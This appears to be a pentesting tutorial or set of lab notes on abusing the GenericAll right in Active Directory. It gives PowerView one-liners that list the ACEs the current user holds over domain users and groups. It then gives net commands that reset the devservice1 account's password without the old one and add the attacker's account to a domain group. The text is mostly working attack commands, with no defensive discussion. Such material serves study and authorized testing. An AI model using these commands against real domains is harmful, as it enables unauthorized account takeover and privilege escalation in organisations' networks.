## Abusing GenericAll

We'll focus on the GenericAll access right, which gives full control of the targeted object.

1. To begin, we first enumerate all domain users that our current account has GenericAll right to.

Note : The command bellow will enumerate all ACEs for all domain users, next we will resolve the SID, add it to the output and finnaly filter on usernames that match our current user as set in the $env:UserDomain and $env:Username environment variables :

```PowerShell
PS C:\tools> Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

The GenericAll access right gives us full control over the devservice1 user, which among other things, allows us to change the password of the account without knowledge of the old password :

```PowerShell
net user devservice1 h4x /domain
```

We can also abuse the ForceChangePassword and AllExtendedRights access rights to change the password of a user account in a similar way without supplying the old password.

The command bellow is similar to the previous enumeration, but we will enumerate all domain groups that our current user has explicit access rights.

```
PS C:\tools> Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

Since GenericAll gives us full access to the group, we can compromise the group by simply adding ourselves to it 

```
net group devgroup v0lk3n /add /domain
```

As with user accounts, we can also use the AllExtendedRights and GenericWrite access rights in a similar way.
